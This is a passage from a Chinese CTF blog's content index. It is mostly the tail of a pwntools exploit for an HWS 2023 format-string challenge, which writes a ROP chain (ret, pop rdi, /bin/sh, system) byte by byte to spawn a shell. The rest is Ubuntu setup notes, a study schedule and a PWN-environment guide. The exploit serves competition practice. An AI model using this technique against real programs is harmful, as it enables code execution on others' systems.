log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;system_____完成前四位_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 在栈上填写system后半部分： \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;system_______完成后四位_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 3.填写binsh的地址 的前四位！！！ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;binsh_____前四位_________addr!!!!!!!\u0026#34;) # binsh = _binsh + libc_base binsh = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() one_gadget = binsh sys_addr_min = hex(one_gadget) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 8 brr[1] = 4 + 8 brr[2] = 3 + 8 brr[3] = 2 + 8 brr[4] = 1 + 8 brr[5] = 0 + 8 log.success(\u0026#34;sys_addr\u0026#34; + hex(one_gadget)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;binsh_____完成前四位_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; binsh后半部分： \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;binsh_______完成后四位_______addr!!!!!!!\u0026#34;) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 4.填写ret 的地址 的前四位！！！（保证64位栈平衡） \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;ret_____前四位_________addr!!!!!!!\u0026#34;) if is_remote == 1 or is_remote == 2: pop__ret = 0x22679 + libc_base else: pop__ret = 0x29cd6 + libc_base one_gadget = pop__ret sys_addr_min = hex(one_gadget) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 16 brr[1] = 4 + 16 brr[2] = 3 + 16 brr[3] = 2 + 16 brr[4] = 1 + 16 brr[5] = 0 + 16 log.success(\u0026#34;sys_addr\u0026#34; + hex(one_gadget)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) # _gdb(2) # pause() if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;ret_____完成前四位_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; ret后半部分： \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;ret_______完成后四位_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数： \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) log.success(\u0026#34;retretttt______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 5.填写pop_rdi_ret 的地址 的前四位！！！ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;pop_rdi_ret______________addr!!!!!!!\u0026#34;) ret_rdi = 0x01453 + run_base1 one_gadget = ret_rdi sys_addr_min = hex(one_gadget) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:6], 16) crr[1] = int(sys_addr_min[6:10], 16) crr[2] = int(sys_addr_min[10:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 4 brr[1] = 2 brr[2] = 0 log.success(\u0026#34;sys_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2])) text = 0 for i in range(3): for j in range(0, 3 - i - 1): if crr[j] \u0026lt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 # if text == 0: # exec(open(\u0026#39;45.py\u0026#39;).read()) # quit() log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2])) payload1 += b\u0026#39;%\u0026#39; + str(crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[1]-crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(12).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[0]-crr[1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(13).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 payload1 += p64(stack_2 + brr[2]) + p64(stack_2 + brr[1]) + p64(stack_2 + brr[0]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;pop_rdi_ret______完成后四位_______addr!!!!!!!\u0026#34;) ret_rdi = 0x01453 + run_base cc = int(hex(ret_rdi)[10:12], 16) dd = int(hex(ret_rdi)[12:14], 16) log.success(\u0026#34;ret_rdi == \u0026#34; + hex(ret_rdi)) log.success(\u0026#34;ccccc == \u0026#34; + hex(cc) + hex(dd)) frr = [1, 2] frr[0] = 1 frr[1] = 0 if cc \u0026lt; dd: cc, dd = dd, cc frr[0], frr[1] = frr[1], frr[0] payload4 = b\u0026#39;%\u0026#39; + str(dd).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload4 += b\u0026#39;%11$hhn\u0026#39; payload4 += b\u0026#39;%\u0026#39; + str(cc - dd).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload4 += b\u0026#39;%12$hhn\u0026#39; n4 = len(payload4) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 payload4 += b\u0026#39;a\u0026#39; * n5 payload4 += p64(stack_2 + frr[1]) + p64(stack_2 + frr[0]) # + p64(stack_2+2) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) pad = b\u0026#34;-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p-%23$p-%24$p-\u0026#34; taolve.sendline(pad) log.success(\u0026#34;retretttt_____________addr!!!!!!!\u0026#34;) # taolve.recvuntil(b\u0026#34;str: \u0026#34;) # taolve.sendline(b\u0026#34;ls\u0026#34;) # taolve.recv() # if is_sleep == 0: # sleep(1) # taolve.sendline(b\u0026#34;cat /flag\u0026#34;) taolve.recv() taolve.interactive() 比赛截图：\n","date":"July 18, 2023","permalink":"/posts/wp/2023_07_hws/fmt2/","section":"Posts","summary":"比赛时的脚本：（有点乱） # encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 1 is_gdb","title":"HWS 2023 PWN fmt exp"},{"content":"","date":"July 18, 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"July 18, 2023","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"PWN"},{"content":"","date":"July 18, 2023","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"July 18, 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"July 18, 2023","permalink":"/categories/wp/","section":"Categories","summary":"","title":"WP"},{"content":"","date":"July 18, 2023","permalink":"/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","section":"Tags","summary":"","title":"格式化字符串漏洞"},{"content":"此文章还在施工中，\n路过的师傅们看看远处的学习记录吧：\nNew article!\r2023 ciscn 初赛 June 30, 2023\u0026middot;1691 字\u0026middot;4 分钟 WP CTF PWN reverse Crypto 文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r# 右键菜单添加自定义命令 # 本文以添加右键使用vscode打开为例 # 1.进入~/.local/share/nautilus/scripts文件夹 cd ~/.local/share/nautilus/scripts # 2.创建文件 vim \u0026#34;Open in vscode\u0026#34; #文件名\u0026#34;Open in vscode\u0026#34;作为右键菜单Scripts的二级菜单名 # 3.添加相应脚本 #!/bin/bash code ./ # 4.保存退出 :wq # 5.赋予权限 sudo chmod u+x Vscode_it 参考链接： (5条消息) Ubuntu18.04添加右键菜单_ubuntu nautilus修改右键_CHAOS_ORDER的博客-CSDN博客\nubuntu系统（22.04）下右键默认是没有新建文档（文本文档、office等）功能的。\n但可以手动添加。\n1、 在主目录下找到模板文件夹，这时候文件夹里面是空的。\n2、 打开文本文档，保存为一个新的空白文档（命名为Txt Document.txt），将这个空白文档保存到这个模板文件夹下。\n这时候再右键空白处就会发现多了一个新建文档选项，下面可选项有Txt Document。\n3、同理可以新建空白的LibreOffice Writer/Calc/Impress等文档，保存至模板文件夹下。\n另外，LibreOffice Writer/Calc/Impress等也可以另存为Office Word/Excel/PPT格式的模板\n把需要的空白模板放入模板文件夹后，右键空白就可以新建相应的文件了。\n参考链接： ubuntu 22.04系统添加右键新建文本文档及Office的功能 - 知乎 (zhihu.com)\n# 右键单击文件并选择“以管理员身份编辑” sudo apt install nautilus-admin # 安装扩展后，您需要重新启动文件管理器以应用更改。 # 不仅关闭并重新打开文件管理器窗口， # 还需要运行命令退出后台服务并让它自动重新启动： nautilus -q ","date":"July 14, 2023","permalink":"/posts/pwn/basic/linux_/","section":"Posts","summary":"此文章还在施工中， 路过的师傅们看看远处的学习记录吧： New article! 2023 ciscn","title":"Linux 配置补充"},{"content":"","date":"July 14, 2023","permalink":"/series/pwn%E5%85%A5%E9%97%A8/","section":"Series","summary":"","title":"PWN入门"},{"content":"","date":"July 14, 2023","permalink":"/tags/ubuntu/","section":"Tags","summary":"","title":"Ubuntu"},{"content":"","date":"July 14, 2023","permalink":"/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"Categories","summary":"","title":"基础知识"},{"content":"","date":"July 12, 2023","permalink":"/categories/life/","section":"Categories","summary":"","title":"Life"},{"content":"此文章还在施工中，\n路过的师傅们看看远处的学习记录吧：\nNew article!\r2023 ciscn 初赛 June 30, 2023\u0026middot;1691 字\u0026middot;4 分钟 WP CTF PWN reverse Crypto 文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r关于 DDL # 7月12日——大创申请书 1 稿 7月12日——字节跳动训练营笔试名单公布 7月14日——大创申请书 2 稿 7月14日——华为hws笔试名单公布 7月15、16日——字节跳动笔试 7月15、16、17日——华为 hws 笔试 7月20日——大创申请答辩PPT 7月25日——大创申请答辩 7月28日——堆学习 7月29日——Android kernel pwn学习 8月05日——蓝帽杯（取证题复习） 关于重要事项 # PWN # 堆入门 unsort bin attack unlink uaf house of use 第一次 第二次 第三次 活动 # 蓝帽杯 7月31日 取证题学习 8月05日 09:00-18:00 字节跳动 7月15、16日 笔试 华为hws硬件安全 7月15、16、17日 笔试 geekcon Android kernel pwn 第一次学习记录 第二次学习记录 第三次学习记录 大创 # 申请书 1稿 2稿 3稿 终稿 答辩 PPT一稿 PPT二稿 答辩稿子 模拟答辩 ","date":"July 12, 2023","permalink":"/pointer/schedole/2023_07_12/","section":"Pointers","summary":"此文章还在施工中， 路过的师傅们看看远处的学习记录吧： New article! 2023 ciscn","title":"my schedole"},{"content":"","date":"July 12, 2023","permalink":"/pointer/","section":"Pointers","summary":"","title":"Pointers"},{"content":"","date":"July 12, 2023","permalink":"/tags/schedole/","section":"Tags","summary":"","title":"schedole"},{"content":"","date":"July 12, 2023","permalink":"/series/schedole/","section":"Series","summary":"","title":"schedole"},{"content":" 前言 # 学习pwn已经有一段时间了，但是由于之前自己一直没有注意文件管理，也没有好的整理习惯，导致现在打pwn主用的ubuntu虚拟机的文件夹十分的混乱，虽然其实不影响目前阶段的学习和做题，但是还是想找一个契机来重装一下虚拟机。正好现在在假期时间，没有那么忙，想着重头开始搭建PWN环境，并做一下记录，一来方便以后的自己回来看，二来也可以为其他想重装ubuntu的PWN环境或者是想入门PWN的师傅提供一些参考。\n（注1：本文在部分工具安装后会补充一些基础用法，已经安装了工具的师傅们也可以看一看）\n（注2：安装的工具不全是关于PWN的，不打pwn的师傅们也可以挑着看👀）\n以下是本文所安装的工具列表，大家可以按顺序安装。\n虚拟机安装（前置条件） 基础工具 vim git gcc qemu（目前不常用，可以跳过） python3 与 pip3 （这个要先装，之后的工具安装可能会用到pip3） gdb 及插件 peda pwndbg gef gdb-multiarch （这个可以先跳过） python PWN 相关库 pwntools LibcSearcher LibcSearcher3（可选） LibcSearcherX（可选） pwnmodules（可选） PWN 相关工具 ROPgadget one_gadget glibc-all-in_one patchelf pwn相关命令补充 seccomp-tools main_arena_offset python Crypto 相关库 gym2 sage math（Crypto） 提高体验的相关工具 （可以在配置pwn环境之前先装好） Oh-My-Zsh （可选） terminator（可选） 虚拟机安装 # 目前流行的虚拟机软件有VMware、Virtual Box和Virtual PC等等，也可以直接使用Windows上面自带的虚拟机，不同虚拟机软件各有优劣，我当时入门的时候是选择了VMware 16虚拟机，感觉安装起来不算很复杂。\n关于linux操作系统的选择，打pwn的师傅们一般都是使用ubuntu，版本的选择则是最新的长期支持版本 22.04（ubuntu 23并不是长期支持的版本）。虽然之前的很多题目都是在Ubuntu 20 或者18 甚至是16 的环境下，不过我们可以使用 patchelf 工具等方法来完成题目，而随着时间的推移，后面新出的pwn题都是会逐渐在较新的环境在运行，所以推荐大家直接安装最新的长期支持的版本——ubuntu 22.04：\nubuntu-22.04.2-desktop-amd64.iso\n可能会遇到的问题： # 1.关于磁盘容量的问题：\n虽然很多教程都推荐最大磁盘容量为20g，但是在我的实际体验中，感觉内存还是越大越好，特别是当虚拟机里已经装了sage math等比较大的工具时，可用空间就不是特别的充足，这个时候倘若你刚好想做一道磁盘取证题，却发现磁盘太大不能够放入linux虚拟机中，可能会有点难受。\n虽然磁盘空间在装好虚拟机之后也能更改，但是需要虚拟机把所有的快照都删除掉，还是比较麻烦的。所以建议师傅们一开始就设置一个比较大的磁盘容量，反正是实际使用多少就占用多少空间的。\n2.关于打印机的一点坑：\n当创建好虚拟机时会有自定义硬件的选项，一开始默认会有打印机，最好移除打印机，如果没有移除打印机的话部分虚拟机可能会出现黑屏等问题。\n如果已经安装完了，也可以点编辑虚拟机设置移除打印机：\n3.关于连网的问题：\n# 检查联网情况，右键打开终端输入指令： ping baidu.com 如果连不上网的话可能需要自己查博客排查原因，实在不行就删掉重新再安装一次，第一次安装出一些小问题很正常，所以看教程的时候一定要做好每一步。\n4.关于软件源更换：\n不想在下安装/更新软件时等比较长的时间的话最好还是换成国内的软件源吧。当然如果不想换的话也可以。我个人感觉换不换都没关系，大不了安装/更新软件时找一些其他的事干，比如看番/写博客文章的时候挂后台下载。\n（补充：“之前踩过阿里源的坑，官方源虽然慢了点，但是没有什么问题”——某师傅如是说）\n5.关于root：\nubuntu安装完之后root是需要我们手动设置密码的，不然不能切换为root用户。步骤如下：\n# 先用我们的初始用户右键打开终端， # 输入命令： sudo passwd # 输入新密码，并重复输入密码，最后提示成功更新即可 此时已完成root密码的设置\n6.关于共享文件夹：\n可以参考： Ubuntu共享文件夹的创建和使用 - 知乎 (zhihu.com)\n# 首先输入下面命令查看是否真的设置成功共享文件夹 # 不会设置的话就点上面的链接看一下就会了 vmware-hgfsclient # 进入共享文件夹 cd /mnt/hgfs/your_shareDir_name 具体安装 # （因为怕有些坑大家先跳进去了，所以就把注意事项放在前面了，大家遇到问题可以先往前翻一翻看看，也可以直接上搜索引擎搜）\n关于虚拟机的具体安装过程，这里就不多说了，可以直接在网上搜现成的教程，网上的师傅们都写的非常详细了，这里也给大家放上一篇比较详细的教程，师傅们可以直接点击跳转：\n在VMware16虚拟机安装Ubuntu详细教程\n关于工具安装的提醒：\n第一次接触 linux 的师傅们可以先去学习一些 linux 的基本操作再回来接着看 后续出现的所有名词如果有不懂的可以直接上搜索引擎查询，永远记住：搜索引擎是我们 CTFers 的好伙伴！ 建议大家在安装各种工具时多拍快照，安装错误后可以直接恢复到之前的快照 Ubuntu的虚拟机大小大概在30g~60g，大家平使用记得留足空间，快照基本都在1g以上，不用的快照及时删除，但是至少要留有一个快照！ 现在，开启我们的PWN环境搭建之旅吧，大概耗时30分钟~90分钟（具体看大家的linux熟练度和网速） 基础工具 # 一些比较基础的工具。\n1. vim\n这个文本编辑器可能新手不太常用，不过以后迟早会用到的，所以可以先安装好，反正不用花多少时间 [doge]\n# 安装 sudo apt install vim # 检测是否安装成功 #法一，不过打印(输出)出来的东西有点多 vim --version # 法二，不过需要看提示退出编辑器界面 vim -v 如何退出vim编辑器：\nvim退出时要先按 : (加shift变成冒号) ，看到光标到了底下再按q + enter退出，w + enter 保存后退出\n推荐阅读：\n精通 VIM ，此文就够了 - 知乎 (zhihu.com)\nLinux vi/vim | 菜鸟教程 (runoob.com)\n史上最全的Vim命令 （这个有点多，其实没必要，我只是放在这当书签🐶）\n2. git\n这个不多说了，必装\n# 安装 sudo apt install git # 检测是否安装成功 git --version 3. gcc\n这个也是必装的\n（学pwn的话是必须要学C语言的）\n# 安装 sudo apt install gcc # 检测是否安装成功 gcc -v 4. qemu （可跳）\n（目前还不太常用，不过也可以先装着）\n# 安装 sudo apt-get install qemu-user qemu-system # 检测是否安装成功 qemu- 5. python3 与 pip3\nubuntu 已经默认装好了python3，如果想用python2的话可以自己装，不过现在已经不推荐用python2了\n# 安装pip3 sudo apt install python3-pip # 检测是否安装成功 pip -V # 设置python命令默认为python3 sudo apt install python-is-python3 # 安装前会显示找不到命令 “python”，安装后可以正常使用python指令 # 其实安装这个软件包只是为了少打那个“3”,所以也可以不装[doge] gdb 插件 # 前排提示：PWNer 必须学会使用 gdb！！！\n（ubuntu默认装有普通的gdb，其实也不是不能直接用，不过还是安装一些插件比较好）\n1. peda\n# git git clone https://github.com/longld/peda.git echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit # 测试： gdb 2. pwndbg\n# (时间较长) git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit # 测试： gdb 3. gef\n# git git clone https://github.com/hugsy/gef.git echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit # 测试： gdb 三个插件使用指南\n平时使用方式一：（注释法）\nsudo vim ~/.gdbinit # vim后参照第一行的内容，在文件内输入下方横线中内容 #（注意每个人的路径是不同的，所以要输入的内容也是不同的） # 选择你要用的一个，另外两个注释掉，保存退出 # 原来： echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit ### 使用pwndbg: # echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit # echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit 平时使用方式二：（多打一行命令法：）\n# 使用前多打一行命令 # 路径需要根据自己的安装路径更改 ### 使用peda: echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gdb ### 使用pwndbg: echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit gdb ### 使用gef: echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit gdb 在exp脚本中调用gdb调试时，可以自己写一个函数来解决：\nfrom pwn import * taolve = process(\u0026#39;./pwn\u0026#39;) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) 